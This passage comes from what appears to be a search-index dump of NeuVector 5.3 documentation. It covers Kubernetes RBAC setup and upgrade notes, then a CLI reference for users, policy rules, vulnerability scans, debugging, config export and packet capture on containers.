--serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:default   Update image names and paths for pulling NeuVector images from Docker hub (docker.io). The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.1.3neuvector/controller:5.1.3neuvector/enforcer:5.1.3neuvector/scanner:latestneuvector/updater:latest  Optionally, remove any references to the NeuVector license and secrets in Helm charts, deployment yaml, configmap, scripts etc, as these are no longer required to pull the images or to start using NeuVector.  Note about SCC and Upgrading via Operator/Helm  Privileged SCC is added to the Service Account specified in the deployment yaml by Operator version 1.3.4 and above in new deployments. In the case of upgrading the NeuVector Operator from a previous version to 1.3.4 or Helm to 2.0.0, please delete Privileged SCC before upgrading.  oc delete rolebinding -n neuvector system:openshift:scc:privileged  ","version":"5.3","tagName":"h3"},{"title":"Command Line","type":0,"sectionRef":"#","url":"/tronubleshooting/cli","content":"","keywords":"","version":"5.3"},{"title":"Using the NeuVector Command Line​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#using-the-neuvector-command-line","content":" The NeuVector solution supports a limited set of functions using the CLI. The CLI is supported through the Manager, which in turn uses a RestAPI to issue commands to the Controller. The Controller then manages the Enforcer(s) appropriately. A complete set of operations is supported through the REST API, which can be exposed directly from the Controller. You can access the NeuVector CLI by typing the cli command for the Manager or Allinone, for example:  kubectl exec -it neuvector-manager-pod-5bb76b6754-rlmnp -n neuvector -- cli   docker exec -it allinone cli   Where ‘allinone’ is the container name for the Controller. You may need to use the container ID for the name.  Although the CLI is available through the Manager, we recommend using the REST API directly into the controller for querying and automation.  CLI Command Examples​  Here are some of the most common CLI commands:  &gt; login &gt; logout   Use the same user/password you use for the console.  &gt; show policy -h Usage: cli show policy [OPTIONS] COMMAND [ARGS]...   &gt; create policy rule -h Usage: cli create policy rule [OPTIONS] FROM TO &gt; delete policy rule -h Usage: cli delete policy rule [OPTIONS] ID   &gt; show log -h Usage: cli show log [OPTIONS] COMMAND [ARGS]...   &gt; set system policy_mode -h Usage: cli set system policy_mode [OPTIONS] MODE Set system policy mode. Options: -h, --help Show this message and exit. MODES: learn=discover evaluate=monitor enforce=protect   &gt; set controller &lt;leader_controller_id&gt; debug -c cpath Turn on debug mode.   &gt; set controller &lt;leader_controller_id&gt; debug Turn off debug mdoe.   More CLI commands are listed below.  ","version":"5.3","tagName":"h3"},{"title":"Command Line Reference & Commands​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#command-line-reference--commands","content":" ","version":"5.3","tagName":"h2"},{"title":"Login/Logout​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#loginlogout","content":" &gt; login -h Usage: cli login [OPTIONS] Login and obtain an authentication token. Options: --username TEXT --password TEXT -h, --help Show this message and exit.   &gt; logout -h Usage: cli logout [OPTIONS] Clear local authentication credentials. Options: -h, --help Show this message and exit.   &gt; exit -h Usage: cli exit [OPTIONS] Exit CLI. Options: -h, --help Show this message and exit.   ","version":"5.3","tagName":"h3"},{"title":"User​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#user","content":" &gt; create user -h Usage: cli create user [OPTIONS] USERNAME ROLE Create user. Options: --email TEXT --locale TEXT --password TEXT --password2 TEXT -h, --help Show this message and exit.   &gt; set user -h Usage: cli set user [OPTIONS] USERNAME COMMAND [ARGS]... Set user configuration. Options: -h, --help Show this message and exit. Commands: local Set local user. remote Set remote user.   &gt; unset user -h Usage: cli unset user [OPTIONS] USERNAME COMMAND [ARGS]... Unset user configuration. Options: -h, --help Show this message and exit. Commands: local Unset local user. remote Unset remote user.   &gt; delete user -h Usage: cli delete user [OPTIONS] USERNAME Delete user. Options: -h, --help Show this message and exit.   ","version":"5.3","tagName":"h3"},{"title":"Policy​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#policy","content":" &gt; create group -h Usage: cli create group [OPTIONS] NAME Create group. For --lable, use format: key,value. If the option value starts with @, the criterion matches string with substring 'value'. Options: --image TEXT container image name. --node TEXT node name. --container TEXT container workload name. --application TEXT container application name. --label TEXT container label. -h, --help Show this message and exit.   &gt; set group -h Usage: cli set group [OPTIONS] NAME Set group configuration. For --lable, use format: key,value. If the option value starts with @, the criterion matches string with substring 'value'. Options: --image TEXT container image name. --node TEXT node name. --container TEXT container workload name. --application TEXT container application name. --label TEXT container label. -h, --help Show this message and exit.   &gt; delete group -h Usage: cli delete group [OPTIONS] NAME Delete group. Options: -h, --help Show this message and exit.   &gt; create policy rule -h Usage: cli create policy rule [OPTIONS] FROM TO Create and append policy rule, with unique rule id (&lt; 10000). Options: --id INTEGER Policy rule ID. (Optional) --ports TEXT Port list. eg: any or 80,8080,8500-8508,tcp/443,tcp/3306-3307,udp/53 --applications TEXT Application list. eg: http,kafka --action [allow|deny] --after INTEGER Specify policy rule ID that the new rule is inserted after. Use 0 to insert to the first. --comment TEXT -h, --help Show this message and exit.   &gt; set policy rule -h Usage: cli set policy rule [OPTIONS] ID Configure policy rule. Options: --from TEXT --to TEXT --ports TEXT Port list. eg: any or 80,8080,8500-8508,tcp/443,tcp/3306-3307,udp/53 --applications TEXT Application list. eg: http,kafka --action [allow|deny] --after INTEGER Specify policy rule ID that the new rule is inserted after. Use 0 to insert to the first. --comment TEXT -h, --help Show this message and exit.   &gt; delete policy rule -h Usage: cli delete policy rule [OPTIONS] ID Delete policy rule. Options: -h, --help Show this message and exit.   &gt; show service -h Usage: cli show service [OPTIONS] COMMAND [ARGS]... Show service Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show service detail.   &gt; set service -h Usage: cli set service [OPTIONS] NAME COMMAND [ARGS]... Set service configuration. Options: -h, --help Show this message and exit. Commands: policy_mode Set service policy mode [discover, monitor, protect]   &gt; set system new_service policy_mode -h SEE System (below)   ","version":"5.3","tagName":"h3"},{"title":"Quarantine​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#quarantine","content":" &gt; set container Usage: cli set container [OPTIONS] ID_OR_NAME COMMAND [ARGS]... Set container configuration. Options: -h, --help Show this message and exit. Commands: quarantine Set container quarantine state.   ","version":"5.3","tagName":"h3"},{"title":"System​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#system","content":" &gt; set system -h Usage: cli set system [OPTIONS] COMMAND [ARGS]... Set system configuration. Options: -h, --help Show this message and exit. Commands: new_service policy_mode Set system policy mode. syslog Set syslog server IP and port (1.2.3.4:514)   &gt; set system syslog -h Usage: cli set system syslog [OPTIONS] COMMAND [ARGS]... Set syslog settings Options: -h, --help Show this message and exit. Commands: category syslog categories... level Set syslog level server Set syslog server IP and port (1.2.3.4:514) status Enable/disable syslog   &gt; set system new_service policy_mode -h Usage: cli set system new_service policy_mode [OPTIONS] MODE Set system new service policy mode. Options: -h, --help Show this message and exit. MODES: discover monitor protect   &gt; unset system Usage: cli unset system [OPTIONS] COMMAND [ARGS]... Unset system configuration. Options: -h, --help Show this message and exit. Commands: syslog_server Unset syslog server address.   ","version":"5.3","tagName":"h3"},{"title":"Vulnerability Scan​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#vulnerability-scan","content":" &gt; set scan auto -h Usage: cli set scan auto [OPTIONS] AUTO Set scanner mode. Options: -h, --help Show this message and exit. AUTO: enable disable   &gt; request scan container -h Usage: cli request scan container [OPTIONS] ID_OR_NAME Request to scan one container Options: -h, --help Show this message and exit.   &gt; request scan node -h Usage: cli request scan node [OPTIONS] ID_OR_NAME Request to scan one node Options: -h, --help Show this message and exit.   &gt; show scan container -h Usage: cli show scan container [OPTIONS] Show scan container summary Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. --node TEXT list scan result on a given node --first INTEGER list the first n scan result, default is list all -h, --help Show this message and exit.   &gt; show scan node -h Usage: cli show scan node [OPTIONS] Show scan node summary Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. --first INTEGER list the first n scan result, default is list all -h, --help Show this message and exit.   &gt; show scan image -h Usage: cli show scan image [OPTIONS] Show scan image summary Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. --first INTEGER list the first n scan result, default is list all -h, --help Show this message and exit.   &gt; show scan report container -h Usage: cli show scan report container [OPTIONS] ID_OR_NAME Show scan container detail report Options: -h, --help Show this message and exit.   &gt; show scan report image -h Usage: cli show scan report image [OPTIONS] NAME Show scan image detail report Options: -h, --help Show this message and exit.   &gt; show scan report node -h Usage: cli show scan report node [OPTIONS] ID_OR_NAME Show scan node detail report Options: -h, --help Show this message and exit.   ","version":"5.3","tagName":"h3"},{"title":"Show/Debug commands​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#showdebug-commands","content":" &gt; show container -h Usage: cli show container [OPTIONS] COMMAND [ARGS]... Show container. Options: -b, --brief brief output --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show container detail. setting show container configurations. stats Show container statistics.   &gt; show enforcer -h Usage: cli show enforcer [OPTIONS] COMMAND [ARGS]... Show enforcer. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: counter Show enforcer counters. detail Show enforcer detail. setting show enforcer configurations. stats Show enforcer statistics.   &gt; show conversation -h Usage: cli show conversation [OPTIONS] COMMAND [ARGS]... Show conversations. Options: -g, --group TEXT filter conversations by group --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: pair Show conversation detail between a pair of...   &gt; show controller -h Usage: cli show controller [OPTIONS] COMMAND [ARGS]... Show controller. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show controller detail. setting show controller configurations.   &gt; show group -h Usage: cli show group [OPTIONS] COMMAND [ARGS]... Show group. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show group detail.   &gt; show log -h Usage: cli show log [OPTIONS] COMMAND [ARGS]... Log operations. Options: -h, --help Show this message and exit. Commands: event List events. threat List threats. violation List policy violations.   &gt; show node -h Usage: cli show node [OPTIONS] COMMAND [ARGS]... Show node. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: bench Show node bench. detail Show node detail. ip_2_container Show node ip-container map.   &gt; show policy -h Usage: cli show policy [OPTIONS] COMMAND [ARGS]... Show policy. Options: -h, --help Show this message and exit. Commands: derived List derived policy rules rule Show policy rule.   &gt; show session -h Usage: cli show session [OPTIONS] COMMAND [ARGS]... Show sessions. Options: -h, --help Show this message and exit. Commands: list list session. summary show session summary.   &gt; show system -h Usage: cli show system [OPTIONS] COMMAND [ARGS]... System operations. Options: -h, --help Show this message and exit. Commands: setting Show system configuration. summary Show system summary.   &gt; show user -h Usage: cli show user [OPTIONS] COMMAND [ARGS]... Show user. Options: -h, --help Show this message and exit.   &gt; set enforcer -h Usage: cli set enforcer [OPTIONS] ID_OR_NAME COMMAND [ARGS]... Set enforcer configuration. Options: -h, --help Show this message and exit. Commands: debug Configure enforcer debug.   &gt; delete conversation pair -h Usage: cli delete conversation pair [OPTIONS] CLIENT SERVER Delete conversations between a pair of containers. Options: -h, --help Show this message and exit.   &gt; delete session -h Usage: cli delete session [OPTIONS] clear session. Options: -e, --enforcer TEXT filter sessions by enforcer --id TEXT filter sessions by session id -h, --help Show this message and exit.   ","version":"5.3","tagName":"h3"},{"title":"Export/Import​","type":1,"pageTitle":"Command Line","url":"/tronubleshooting/cli#exportimport","content":" &gt; request export config -h Usage: cli request export config [OPTIONS] Export system configurations. Options: -s, --section [user|policy] -f, --filename PATH -h, --help Show this message and exit.   &gt; request import config -h Usage: cli request import config [OPTIONS] FILENAME Import system configurations. Options: -h, --help Show this message and exit.   Packet Sniffer​  note Sniffer files are stored in the /var/neuvector/pcap directory in the Enforcer container. Make sure you map the volume to your guest machine directory or local system directory to be able to access the files. For example in the docker-compose file add ‘- /var/neuvector:/var/neuvector’ in volumes.  To start packet capture on a pod, you will need to know the containerID to pass into the ID_OR_NAME field. You can do this with show container -c &lt;container_name&gt;. then start the sniffer with request sniffer start &lt;container_id&gt;. For example,  admin#neuvector-svc-controller.neuvector&gt; show container -c pos-test +--------------+-----------------------------------------------------------------------+-------------+---------------------------------------+----------+--------------+----------------------+------------------------+ | id | name | host_name | image | state | applications | started_at | interfaces | +--------------+-----------------------------------------------------------------------+-------------+---------------------------------------+----------+--------------+----------------------+------------------------+ | fc0b5458db1a | k8s_POD_pos-test_pos-test_bd3e2c9d-847a-4bcd-ac76-cb6fa651a8d2_0 | gtk8s-node2 | k8s.gcr.io/pause:3.2 | discover | [] | 2021-09-24T15:36:05Z | eth0:192.168.128.22/32 | | 0f48441a21cd | k8s_POD_pos-test_pos-test_c405efe5-f767-4fbf-b424-ea3106d9ec62_0 | gtk8s-node1 | k8s.gcr.io/pause:3.2 | exit | [] | 2021-09-23T23:53:56Z | {} | | 8ddb6052f2d1 | k8s_pos-test_pos-test_pos-test_bd3e2c9d-847a-4bcd-ac76-cb6fa651a8d2_0 | gtk8s-node2 | docker.io/garricktam/jmeter-pos:5.4.1 | discover | [] | 2021-09-24T15:36:40Z | eth0:192.168.128.22/32 | +--------------+-----------------------------------------------------------------------+-------------+---------------------------------------+----------+--------------+----------------------+------------------------+ admin#neuvector-svc-controller.neuvector&gt; request sniffer start 8ddb6052f2d1 admin#neuvector-svc-controller.neuvector&gt; show sniffer -c 8ddb6052f2d1 Total sniffers: 2 +--------------------------------------------------------------------------+---------+--------------+--------------+------+-------------+ | id | status | enforcer_id | container_id | size | file_number | +--------------------------------------------------------------------------+---------+--------------+--------------+------+-------------+ | 01119c164ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | stopped | 4ab9cc73178f | 8ddb6052f2d1 | 24 | 1 | | 1f0702444ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | running | 4ab9cc73178f | 8ddb6052f2d1 | 24 | 1 | +--------------------------------------------------------------------------+---------+--------------+--------------+------+-------------+ admin#neuvector-svc-controller.neuvector&gt; request sniffer stop 1f0702444ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 admin#neuvector-svc-controller.neuvector&gt; show sniffer -c 8ddb6052f2d1 Total sniffers: 2 +--------------------------------------------------------------------------+---------+--------------+--------------+-------+-------------+ | id | status | enforcer_id | container_id | size | file_number | +--------------------------------------------------------------------------+---------+--------------+--------------+-------+-------------+ | 01119c164ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | stopped | 4ab9cc73178f | 8ddb6052f2d1 | 24 | 1 | | 1f0702444ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | stopped | 4ab9cc73178f | 8ddb6052f2d1 | 20165 | 1 | +--------------------------------------------------------------------------+---------+--------------+--------------+-------+-------------+   important If the duration is not set, you will need to find the sniffer ID in order to stop the sniffer. To do this, show sniffer -c &lt;containerID&gt;. Follow by request sniffer stop &lt;sniffer_ID&gt;.  Command options:  request sniffer start -h Usage: cli request sniffer start [OPTIONS] Start sniffer. Options: -e, --enforcer TEXT Add sniffer by enforcer -c, --container TEXT Add sniffer by container -f, --file_number INTEGER Maximum number of rotation files -s, --file_size INTEGER Maximum size (in MB) of rotation files -o, --options TEXT Sniffer filter -h, --help Show this message and exit.   show sniffer -h Usage: cli show sniffer [OPTIONS] COMMAND [ARGS]... Show sniffer. Options: -e, --enforcer TEXT Show sniffers by enforcer -h, --help Show this message and exit.   request sniffer stop -h Usage: cli request sniffer stop [OPTIONS] ID Stop sniffer. You may need to include both the enforcer ID and the container ID. Options: -e, --enforcer TEXT Delete sniffer by enforcer -h, --help Show this message and exit.  ","version":"5.3","tagName":"h3"}],"options":{"languages":["en"],"indexBaseUrl":true,"maxHits":10,"highlightResult":true,"id":"default"}}